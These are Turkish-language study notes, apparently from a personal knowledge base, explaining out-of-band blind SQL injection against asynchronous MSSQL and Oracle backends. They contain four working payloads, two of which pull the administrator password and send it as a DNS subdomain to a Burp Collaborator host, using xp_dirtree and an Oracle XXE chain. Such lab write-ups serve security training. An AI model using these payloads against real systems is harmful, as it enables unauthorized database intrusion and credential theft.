


# OAST (Out-of-Band) Blind SQL Injection

**Etiketler:** `#web-hacking` `#sqli` `#blind-sqli` `#oast` `#burp-collaborator` `#mssql`
**Ana Konu:** [[01_SQL_Injection]] 
## 1. Sorun: Asenkron (Arka Plan) İşlemler
Normal şartlarda web uygulamasına bir SQL zafiyet yükü (payload) gönderildiğinde, sunucu bunu veritabanına iletir ve cevabı HTTP yanıtı olarak döndürür. Ancak uygulamanın asenkron çalıştığı durumlarda:
* Uygulama, isteği alır ve SQL sorgusunu arka planda ayrı bir **thread (iş parçacığı)** üzerinden çalıştırır.
* Kullanıcı anında "İşleminiz alındı" gibi bir HTTP yanıtı görürken, SQL sorgusu arkada çalışmaya devam eder.
* Sayfa içeriği değişmediği, veritabanı hata mesajı basmadığı ve `SLEEP()` gibi komutlar sayfanın yüklenme süresini etkilemediği için **Time-based, Error-based veya Boolean-based gibi klasik tekniklerin hiçbiri işe yaramaz.**

## 2. Çözüm: Out-of-Band (Ağ Üzerinden Veri Sızdırma)
Web uygulaması (frontend) veritabanından cevap döndürmüyorsa, **veritabanının doğrudan saldırgana ulaşması** sağlanır.
* Veritabanına, saldırganın kontrol ettiği harici bir sunucuya ağ isteği (network interaction) yaptıracak bir SQL komutu enjekte edilir.
* Çalınmak istenen veri (örneğin admin parolası), bu harici ağ isteğinin (örneğin bir DNS sorgusunun) içine yerleştirilerek doğrudan saldırganın sunucusuna sızdırılır (exfiltration).

## 3. Neden DNS Protokolü Tercih Ediliyor?
Ağ isteğini dışarı çıkarmak için en etkili protokol **DNS (Alan Adı Sistemi)**'dir.
* Hedef sistemin güvenlik duvarı (firewall) dışarıya giden rastgele HTTP veya TCP bağlantılarını engellese bile, üretim ağlarındaki (production networks) sunucuların normal çalışabilmesi için **dışarı giden (egress) DNS sorgularına mecburen izin verilir.**
* Veritabanına `[calinan_veri].saldirgan-sunucu.com` adresini çözmesi söylendiğinde, güvenlik duvarı bunu standart bir DNS işlemi sanarak geçirir.

---

## 4. Pratik Sömürü: Burp Collaborator
OAST tekniklerini kullanmak için en kolay ve güvenilir araç **Burp Collaborator**'dır (Burp Suite Pro içinde yerleşik gelir).
* Zafiyetli uygulamaya gönderilen payload sonucunda hedef sistemden bir DNS veya HTTP isteği çıkarsa, Collaborator sunucusu bunu yakalar ve sana bildirir.
* Bu teknikler, hedef sistemde kullanılan **veritabanı türüne spesifiktir** (Örn: MSSQL, Oracle, MySQL için komutlar değişir).

### MSSQL OAST Payload Örneği
Microsoft SQL Server (MSSQL) üzerinde veritabanına zorla bir DNS araması (lookup) yaptırmak için şu komut kullanılır:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

```

# OAST Blind SQL Injection (Oracle - XXE Kombinasyonu)

**Etiketler:** `#web-hacking` `#sqli` `#blind-sqli` `#oast` `#oracle` `#xxe`

## Senaryo
Web uygulamasının analitik için kullandığı `TrackingId` çerezi, asenkron olarak arka planda bir **Oracle** veritabanında çalıştırılıyor. Klasik OAST DNS tetikleyicileri (MSSQL `xp_dirtree` gibi) yerine, bu senaryoda Oracle veritabanındaki XML ayrıştırma (parsing) özelliği kullanılarak DNS isteği zorlanıyor.

## Sömürü Adımları (Exploitation)

1. Web sitesinin ana sayfasını yenileyerek Burp Suite Proxy üzerinden HTTP isteği yakalanır (Intercept).
2. İstek başlıklarındaki `TrackingId` çerezinin değerine aşağıdaki OAST payload'u eklenir. (Gerçek dünyada `BURP-COLLABORATOR-SUBDOMAIN` yazan yere *Interactsh* veya kendi OAST sunucu adresimiz girilir).

### Enjekte Edilen Payload:
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## 🧠 Payload Analizi (Satır Satır Ne Yapıyor?)

Bu payload siber güvenlikte çok popüler olan **"Zincirleme Zafiyet" (Chained Vulnerability)** kavramına mükemmel bir örnektir. SQL Injection zafiyeti kullanılarak veritabanı içinde bir XXE saldırısı tetiklenir:

- **`x'+UNION+SELECT...`** : Orijinal `TrackingId` sorgusunun metin dizisini tek tırnakla (`'`) kapatıp, `UNION` ile kendi sorgumuzu sonuca eklememizi sağlar.
    
- **`EXTRACTVALUE(xmltype('...'))`** : Oracle veritabanlarında XML verilerini okumak ve işlemek için kullanılan yerleşik (built-in) bir fonksiyondur.
    
- **`<!ENTITY+%25+remote+SYSTEM+"http%3a//..."...`** : Bu kısım asıl **XXE** saldırısıdır. Veritabanının XML ayrıştırıcısına (parser) şu emri verir: _"Git bu HTTP adresindeki dış kaynağı (SYSTEM) bul ve oku"_. Veritabanı bu dış kaynağı okumaya çalıştığı an ağ üzerinden DNS sorgusu tetiklenmiş olur.
    
- **`%3f`, `%3d`, `%25` vb.** : Bunlar URL kodlamalarıdır (URL Encoding). İşaretlerin HTTP isteği içinde yolda bozulmadan veritabanına ulaşması için sırasıyla `?`, `=`, `%` gibi karakterler kodlanmıştır (Örn: `<?xml version="1.0"...` ifadesinin kodlanmış halidir).
    
- **`FROM+dual--`** : Hedefin **Oracle** veritabanı olduğunu buradan anlarız. Oracle'da bir `SELECT` sorgusu yazarken kural gereği mutlaka bir tablo seçmek zorundasındır. `dual`, Oracle'ın bu tür sanal matematiksel veya fonksiyonel sorgular için kullandığı varsayılan boş sistem tablosudur. En sondaki `--` ise geri kalan kodu yorum satırı yapar.


# OAST ile Veri Sızdırma (Data Exfiltration)

**Etiketler:** `#sqli` `#oast` `#data-exfiltration` `#mssql`

Sistemin dışarıya DNS isteği (ping) atabildiği doğrulandıktan sonra, bu bant dışı (OAST) kanal, veritabanından **hassas verileri çalmak** için kullanılabilir. 

Metindeki örnekte bir Microsoft SQL Server (MSSQL) üzerinden Administrator parolasının nasıl çalındığını görüyoruz:

### Enjekte Edilen Payload
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')--
```

### Payload Analizi (Veri Nasıl Çalınıyor?)

Buradaki zekice kurgulanmış mantık şudur: Çalınmak istenen veri veritabanından çekilir ve bizim dinlediğimiz sunucu adresinin en başına bir **alt alan adı (subdomain)** olarak yapıştırılarak DNS sorgusu atılır.

Satır satır inceleyelim:

- **`';`** : Önceki orijinal sorguyu kapatıp kendi komutlarımıza (Stacked Queries) geçiş yapıyoruz.
    
- **`declare @p varchar(1024);`** : `@p` adında, içine 1024 karaktere kadar metin koyabileceğimiz geçici bir değişken (variable) oluşturuyoruz.
    
- **`set @p=(SELECT password FROM users WHERE username='Administrator');`** : Asıl hırsızlığın yapıldığı yer! `users` tablosuna gidip Administrator kullanıcısının şifresini buluyor ve az önce oluşturduğumuz `@p` değişkeninin içine kaydediyoruz. (Diyelim ki şifre `S3cure`).
    
- **`exec('master..xp_dirtree "//'+@p+'.bizim-sunucumuz.com/a"')`** : MSSQL'in DNS sorgusu atan `xp_dirtree` komutunu çalıştırıyoruz. Ancak adresi yazarken araya `+@p+` koyarak dinamik bir birleştirme yapıyoruz. Sistem bu komutu çalıştırdığında aslında şu adrese DNS sorgusu atıyor: `//S3cure.bizim-sunucumuz.com/a`
    
- **`--`** : Geri kalan orijinal kodu yorum satırı yapıp iptal ediyoruz.

# OAST ile Veri Sızdırma (Oracle SQLi + XXE Zinciri)

**Etiketler:** `#web-hacking` `#sqli` `#blind-sqli` `#oast` `#data-exfiltration` `#oracle` `#xxe`

## Senaryo
Uygulama, analitik için kullanılan `TrackingId` çerezini arka planda (asenkron olarak) bir **Oracle** veritabanında çalıştırıyor. Klasik yöntemler işe yaramadığı için, veritabanındaki `administrator` şifresini çalmak amacıyla SQL Injection ve XXE (XML External Entity) zafiyetleri zincirlenerek (chained) bir OAST veri sızdırma saldırısı gerçekleştirilir.

## Sömürü Adımları (Exploitation)

1. İlgili `TrackingId` HTTP çerezine müdahale edilir ve aşağıdaki payload enjekte edilir. 
2. (Gerçek dünyada `BURP-COLLABORATOR-SUBDOMAIN` yazan yere kendi dinlediğimiz OAST sunucu adresi, örn: Interactsh adresi yazılır).

### Enjekte Edilen Payload (Veri Çalan XXE):
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## 🧠 Payload Analizi (Veri Nasıl Dışarı Çıkarılıyor?)

Bu payload, bir önceki "OAST DNS Tetikleme" payload'unun çok daha gelişmiş ve ölümcül versiyonudur. En büyük fark, XML dış kaynak (SYSTEM) adresinin içine dinamik bir SQL sorgusunun yerleştirilmiş olmasıdır.

- **`x'+UNION+SELECT+EXTRACTVALUE(xmltype('...'),'/l')+FROM+dual--`** : Orijinal sorguyu kapatıp, Oracle'ın XML ayrıştırıcısını tetikleyen temel çerçevedir.
    
- **`<!ENTITY+%25+remote+SYSTEM+"http%3a//...`** : XXE saldırısını başlatıp veritabanına "Şu HTTP adresine git" emrini verdiğimiz kısımdır.
    
- **`'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'`** : **Sihrin gerçekleştiği asıl yer burasıdır!**
    
    - Oracle SQL dilinde **`||`** (iki dikey çizgi) işareti, metinleri birleştirmeye (String Concatenation) yarar.
        
    - Veritabanı, adresi çözümlemeden önce aradaki `SELECT` sorgusunu çalıştırır ve admin şifresini bulur (Örn: `GizliSifre123`).
        
    - Ardından `||` operatörleri sayesinde bu şifreyi, bizim Collaborator adresimizin tam başına ekler.
        
- **Sonuç:** Veritabanı, dış kaynağa erişmeye çalışırken aslında şu adrese DNS sorgusu (lookup) yapar: `http://GizliSifre123.bizim-sunucumuz.com/`
